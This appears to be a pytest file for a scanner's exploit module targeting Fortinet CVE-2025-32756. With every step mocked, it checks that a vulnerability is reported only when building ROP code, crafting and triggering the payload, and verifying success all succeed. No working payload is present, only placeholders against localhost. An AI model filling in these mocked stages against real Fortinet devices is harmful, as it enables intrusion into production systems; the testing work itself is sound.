def testCheck_whenPwnModuleIsNoneInCheckMethod_shouldReturnEmptyList(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with mock.patch("agent.exploits.cve_2025_32756.pwn", None):
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0


@mock.patch.object(
    cve_2025_32756.FortinetCVE202532756Exploit, "accept", return_value=True
)
def testCheck_whenBuildExploitCodeFails_shouldReturnEmptyList(
    mock_accept: mock.Mock, exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with mock.patch.object(
        exploit_instance, "_build_exploit_code", return_value=None
    ) as mock_build:
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0
        mock_build.assert_called_once()


@mock.patch.object(
    cve_2025_32756.FortinetCVE202532756Exploit, "accept", return_value=True
)
def testCheck_whenCraftPayloadFails_shouldReturnEmptyList(
    mock_accept: mock.Mock, exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with (
        mock.patch.object(
            exploit_instance, "_build_exploit_code", return_value=b"dummy_code"
        ),
        mock.patch.object(
            exploit_instance, "_craft_exploit_payload", return_value=None
        ) as mock_craft,
    ):
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0
        mock_craft.assert_called_once_with(b"dummy_code")


@mock.patch("time.sleep", return_value=None)
@mock.patch.object(
    cve_2025_32756.FortinetCVE202532756Exploit, "accept", return_value=True
)
def testCheck_whenVerificationFails_shouldReturnEmptyList(
    mock_accept: mock.Mock,
    mock_sleep: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with (
        mock.patch.object(
            exploit_instance, "_build_exploit_code", return_value=b"dummy_code"
        ),
        mock.patch.object(
            exploit_instance, "_craft_exploit_payload", return_value=b"dummy_payload"
        ),
        mock.patch.object(
            exploit_instance, "_trigger_vulnerability", return_value=True
        ),
        mock.patch.object(
            exploit_instance, "_verify_exploit_success", return_value=False
        ) as mock_verify,
    ):
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0
        mock_verify.assert_called_once_with(target.host, target.port)


@mock.patch("time.sleep", return_value=None)
@mock.patch.object(
    cve_2025_32756.FortinetCVE202532756Exploit, "accept", return_value=True
)
def testCheck_whenExploitationSucceeds_shouldReportVulnerability(
    mock_accept: mock.Mock,
    mock_sleep: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with (
        mock.patch.object(
            exploit_instance, "_build_exploit_code", return_value=b"dummy_rop_code"
        ) as mock_build,
        mock.patch.object(
            exploit_instance, "_craft_exploit_payload", return_value=b"full_payload"
        ) as mock_craft,
        mock.patch.object(
            exploit_instance, "_trigger_vulnerability", return_value=True
        ) as mock_trigger,
        mock.patch.object(
            exploit_instance, "_verify_exploit_success", return_value=True
        ) as mock_verify,
    ):
        vulnerabilities = exploit_instance.check(target)
        mock_build.assert_called_once()
        mock_craft.assert_called_once_with(b"dummy_rop_code")
        mock_trigger.assert_called_once_with(b"full_payload", target.host, target.port)
        mock_verify.assert_called_once_with(target.host, target.port)
        assert len(vulnerabilities) == 1
        vuln = vulnerabilities[0]
        assert vuln.entry.title == cve_2025_32756.VULNERABILITY_TITLE
        assert vuln.entry.description == cve_2025_32756.VULNERABILITY_DESCRIPTION
        assert vuln.entry.risk_rating == cve_2025_32756.RISK_RATING
        assert vuln.technical_detail is not None
        assert "CVE-2025-32756" in vuln.technical_detail
        assert vuln.vulnerability_location is not None
        assert vuln.dna is not None
